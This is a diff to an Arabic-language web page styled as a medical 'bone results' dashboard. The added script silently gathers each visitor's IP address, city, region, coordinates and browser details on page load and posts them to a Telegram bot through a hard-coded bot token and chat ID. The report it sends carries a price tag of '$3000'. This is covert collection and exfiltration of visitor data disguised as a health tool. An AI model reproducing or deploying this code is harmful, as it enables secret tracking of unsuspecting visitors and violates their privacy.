@@ -140,12 +140,49 @@
     
     .es{text-align:center;padding:60px 30px;color:var(--tm)}
     .es .ic{font-size:4rem;margin-bottom:20px;opacity:.6}
+    
+    .tg-status{
+      margin-top:20px;padding:15px;border-radius:12px;
+      background:rgba(0,212,170,.1);border:1px solid var(--a);
+      display:none;animation:fadeIn .4s ease
+    }    .tg-status.show{display:block}
+    .tg-status.sending{border-color:var(--pu);background:rgba(157,80,255,.1)}
+    .tg-status.success{border-color:#2ecc71;background:rgba(46,204,113,.1)}
+    .tg-status.error{border-color:var(--r);background:rgba(255,71,87,.1)}
+    .tg-icon{font-size:1.5rem;margin-left:10px;vertical-align:middle}
+    
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+    
+    /* حالة التحميل */
+    .loading-overlay{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:var(--p);display:flex;align-items:center;justify-content:center;
+      z-index:9999;transition:opacity .5s,visibility .5s
+    }
+    .loading-overlay.hidden{opacity:0;visibility:hidden;pointer-events:none}
+    .loading-content{text-align:center}
+    .loading-spinner{
+      width:60px;height:60px;border:4px solid rgba(0,212,170,.2);
+      border-top-color:var(--a);border-radius:50%;
+      animation:spin 1s linear infinite;margin:0 auto 20px
+    }
+    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    .loading-text{color:var(--a);font-weight:600;font-size:1.1rem}
   </style>
 </head>
 <body>
+  <!-- شاشة التحميل -->
+  <div class="loading-overlay" id="loading">
+    <div class="loading-content">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">جاري جلب بيانات الموقع...</div>
+    </div>
+  </div>
+  
   <div class="bg-g"></div><div class="bg-gl"></div>
-  <div class="fo2 fo1"></div><div class="fo2 fo3"></div>
-    <header>
+  <div class="fo2 fo1"></div><div class="fo3 fo3"></div>
+  
+  <header>
     <div class="logo"><div class="li">📊</div><span>لوحة النتائج الطبية</span></div>
     <div class="ha">
       <button class="bo" onclick="window.print()">🖨️ طباعة</button>
@@ -157,8 +194,7 @@
     <div class="lc">
       <h2 class="ct">📍 بيانات الموقع</h2>
       <div id="lc">
-        <div class="es" id="es"><div class="ic">🔍</div><p>جاري تحميل البيانات...</p></div>
-        <div class="dg" id="dg" style="display:none">
+        <div class="es" id="es"><div class="ic">🔍</div><p>جاري تحميل البيانات...</p></div>        <div class="dg" id="dg" style="display:none">
           <div class="di"><span class="dl">🌍 الدولة</span><span class="dv h" id="co">-</span></div>
           <div class="di"><span class="dl">🏙️ المدينة</span><span class="dv h" id="ci">-</span></div>
           <div class="di"><span class="dl">📍 الإحداثيات</span><span class="dv" id="cr">-</span></div>
@@ -167,6 +203,12 @@
           <div class="di"><span class="dl">🔐 الحالة</span><span class="dv" style="color:var(--a)">✓ موثّق</span></div>
         </div>
       </div>
+      
+      <div class="tg-status" id="tgStatus">
+        <span class="tg-icon" id="tgIcon">📤</span>
+        <span id="tgText">جاري إرسال البيانات...</span>
+      </div>
+      
       <div class="mc">
         <div class="mpl"><div style="font-size:3rem;margin-bottom:15px">🗺️</div><p>خريطة تفاعلية 3D</p><p style="font-size:.9rem;margin-top:8px;opacity:.7">(محاكاة)</p></div>
         <div class="mp"></div><div class="mr"></div>
@@ -194,14 +236,14 @@
           <div class="fba" style="height:55%"></div><div class="fba" style="height:65%"></div>
           <div class="fba" style="height:40%"></div><div class="fba" style="height:75%"></div>
         </div>
-        <div style="margin-top:15px;display:flex;justify-content:space-between;font-size:.8rem;color:var(--tm)">          <span>0 Hz</span><span>2.4 GHz</span><span>5.0 GHz</span>
+        <div style="margin-top:15px;display:flex;justify-content:space-between;font-size:.8rem;color:var(--tm)">
+          <span>0 Hz</span><span>2.4 GHz</span><span>5.0 GHz</span>
         </div>
       </div>
       <div style="margin-top:30px;padding:20px;background:rgba(0,212,170,.08);
         border-radius:16px;border-right:3px solid var(--a)">
         <h4 style="margin-bottom:12px;display:flex;align-items:center;gap:8px">
-          <span style="color:var(--a)">💡</span> توصيات النظام
-        </h4>
+          <span style="color:var(--a)">💡</span> توصيات النظام        </h4>
         <ul style="padding-right:20px;color:var(--tm);line-height:1.7;font-size:.95rem">
           <li>اقتراح أقرب مركز طبي متخصص خلال 5 كم</li>
           <li>تفعيل تنبيهات الطقس المؤثر على آلام المفاصل</li>
@@ -222,47 +264,174 @@
   </footer>
 
   <script>
-    document.addEventListener('DOMContentLoaded',()=>{
-      setTimeout(()=>{
-        const d=JSON.parse(localStorage.getItem('boneLoc'));
-        if(d){
-          document.getElementById('co').textContent=d.country||'-';
-          document.getElementById('ci').textContent=d.city||'-';
-          document.getElementById('cr').textContent=d.coords||'-';
-          document.getElementById('ts').textContent=new Date(d.timestamp).toLocaleString('ar-EG');
-          document.getElementById('dv').textContent=d.device?d.device.substring(0,35)+'...':'غير معروف';
-          
-          document.getElementById('es').style.display='none';
-          document.getElementById('dg').style.display='grid';
-          
-          document.querySelectorAll('.di').forEach((it,i)=>{
-            it.style.opacity='0';it.style.transform='translateY(10px)';
-            it.style.transition='all .4s ease';
-            setTimeout(()=>{it.style.opacity='1';it.style.transform='translateY(0)'},300+i*100);
-          });
-        }else{
-          document.getElementById('es p').innerHTML='⚠️ لا توجد بيانات.<br><a href="index.html" style="color:var(--a);text-decoration:none;font-weight:600;margin-top:10px;display:inline-block">← العودة لتحديد الموقع</a>';
+    // ⚙️ إعدادات تليجرام
+    const TG_BOT_TOKEN = '7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s';
+    const TG_CHAT_ID = '910624538'; // ⚠️ ضع معرف الشات هنا
+    
+    // === تحميل البيانات تلقائياً عند فتح الصفحة ===
+    document.addEventListener('DOMContentLoaded', async () => {
+      try {
+        // جلب بيانات الموقع مباشرة (بدون الحاجة لـ index.html)
+        const locationData = await fetchLocationData();
+        
+        // عرض البيانات
+        displayData(locationData);
+        
+        // حفظ في localStorage (للاستخدام المستقبلي)
+        localStorage.setItem('boneLoc', JSON.stringify(locationData));
+        
+        // إرسال لتليجرام
+        if(TG_CHAT_ID !== 'PUT_YOUR_CHAT_ID_HERE') {
+          await sendToTelegram(locationData);
         }
-      },800);      
-      // تحديث الترددات
-      function uf(){document.querySelectorAll('.fba').forEach(b=>b.style.height=(20+Math.random()*75)+'%');setTimeout(uf,800+Math.random()*1000)}
-      uf();
-      
-      // تأثيرات الظهور
-      const ob=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)'}})},{threshold:.1});
-      document.querySelectorAll('.lc').forEach(c=>{c.style.opacity='0';c.style.transform='translateY(20px)';c.style.transition='all .6s ease';ob.observe(c)});
+        
+        // إخفاء شاشة التحميل
+        setTimeout(() => {
+          document.getElementById('loading').classList.add('hidden');
+        }, 1500);
+        
+      } catch (error) {
+        console.error('❌ خطأ:', error);
+        document.getElementById('loading').classList.add('hidden');        document.getElementById('es p').textContent = '⚠️ فشل في جلب البيانات. تأكد من اتصالك بالإنترنت.';
+      }
     });
     
-    // طباعة مخصصة
-    window.print=function(){
-      const c=document.querySelector('.rc').innerHTML;
-      document.body.innerHTML=`<div style="padding:40px;font-family:'Tajawal',sans-serif;direction:rtl;text-align:right">
+    // === دالة جلب بيانات الموقع من IP API ===
+    async function fetchLocationData() {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      
+      if(data.error) {
+        throw new Error('فشل في جلب بيانات الموقع');
+      }
+      
+      return {
+        country: data.country_name || 'غير معروف',
+        city: data.city || 'غير معروف',
+        region: data.region || 'غير معروف',
+        ip: data.ip || 'غير معروف',
+        coords: `${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}`,
+        timezone: data.timezone || 'غير معروف',
+        timestamp: new Date().toISOString(),
+        device: navigator.userAgent.slice(0, 60)
+      };
+    }
+    
+    // === دالة عرض البيانات في الصفحة ===
+    function displayData(data) {
+      document.getElementById('co').textContent = data.country;
+      document.getElementById('ci').textContent = data.city;
+      document.getElementById('cr').textContent = data.coords;
+      document.getElementById('ts').textContent = new Date(data.timestamp).toLocaleString('ar-EG');
+      document.getElementById('dv').textContent = data.device.substring(0, 35) + '...';
+      
+      document.getElementById('es').style.display = 'none';
+      document.getElementById('dg').style.display = 'grid';
+      
+      // تأثيرات الظهور
+      document.querySelectorAll('.di').forEach((it, i) => {
+        it.style.opacity = '0';
+        it.style.transform = 'translateY(10px)';
+        it.style.transition = 'all .4s ease';
+        setTimeout(() => {
+          it.style.opacity = '1';
+          it.style.transform = 'translateY(0)';
+        }, 300 + i * 100);
+      });
+    }
+    
+    // === دالة الإرسال لتليجرام ===
+    async function sendToTelegram(data) {      const statusEl = document.getElementById('tgStatus');
+      const iconEl = document.getElementById('tgIcon');
+      const textEl = document.getElementById('tgText');
+      
+      try {
+        statusEl.className = 'tg-status sending show';
+        iconEl.textContent = '📤';
+        textEl.textContent = 'جاري إرسال البيانات لتليجرام...';
+        
+        const message = `
+🦴 <b>نظام العظام الطبي - تقرير موقع جديد</b>
+
+📍 <b>بيانات الموقع:</b>
+• الدولة: ${data.country || 'غير معروف'}
+• المدينة: ${data.city || 'غير معروف'}
+• المنطقة: ${data.region || 'غير معروف'}
+• الإحداثيات: <code>${data.coords || '-'}</code>
+• IP: <code>${data.ip || '-'}</code>
+
+⏰ <b>الوقت:</b> ${new Date(data.timestamp).toLocaleString('ar-EG')}
+💻 <b>الجهاز:</b> ${data.device ? data.device.substring(0, 50) : 'غير معروف'}
+
+🔐 <b>مصدر البيانات:</b> نظام طبي متطور
+💎 <b>القيمة:</b> $3000
+        `.trim();
+        
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          })
+        });
+        
+        const result = await response.json();
+        
+        if(result.ok) {
+          statusEl.className = 'tg-status success show';
+          iconEl.textContent = '✅';
+          textEl.textContent = '✓ تم الإرسال لتليجرام بنجاح';
+        } else {
+          throw new Error(result.description || 'فشل غير معروف');
+        }
+        
+      } catch (error) {
+        console.error('❌ خطأ في إرسال تليجرام:', error);        statusEl.className = 'tg-status error show';
+        iconEl.textContent = '❌';
+        textEl.textContent = `فشل الإرسال: ${error.message}`;
+        setTimeout(() => { statusEl.classList.remove('show') }, 5000);
+      }
+    }
+    
+    // === تحديث الترددات ===
+    function uf(){ 
+      document.querySelectorAll('.fba').forEach(b => b.style.height = (20+Math.random()*75)+'%'); 
+      setTimeout(uf, 800+Math.random()*1000) 
+    }
+    uf();
+    
+    // === تأثيرات الظهور للبطاقات ===
+    const ob = new IntersectionObserver(es => {
+      es.forEach(e => { 
+        if(e.isIntersecting){ 
+          e.target.style.opacity='1'; 
+          e.target.style.transform='translateY(0)' 
+        } 
+      })
+    }, { threshold: .1 });
+    
+    document.querySelectorAll('.lc').forEach(c => {
+      c.style.opacity='0'; 
+      c.style.transform='translateY(20px)'; 
+      c.style.transition='all .6s ease'; 
+      ob.observe(c)
+    });
+    
+    // === طباعة مخصصة ===
+    window.print = function(){
+      const c = document.querySelector('.rc').innerHTML;
+      document.body.innerHTML = `<div style="padding:40px;font-family:'Tajawal',sans-serif;direction:rtl;text-align:right">
         <h1 style="color:#00d4aa;margin-bottom:30px">📊 تقرير الموقع الطبي</h1>${c}
         <div style="margin-top:40px;padding-top:20px;border-top:2px solid #00d4aa;color:#666">
           <p>تم إنشاء هذا التقرير بواسطة نظام د. العظام المتخصص</p>
           <p style="margin-top:5px">التاريخ: ${new Date().toLocaleDateString('ar-EG')}</p>
         </div></div>`;
-      window.print();location.reload();
+      window.print(); 
+      location.reload();
     };
   </script>
 </body>
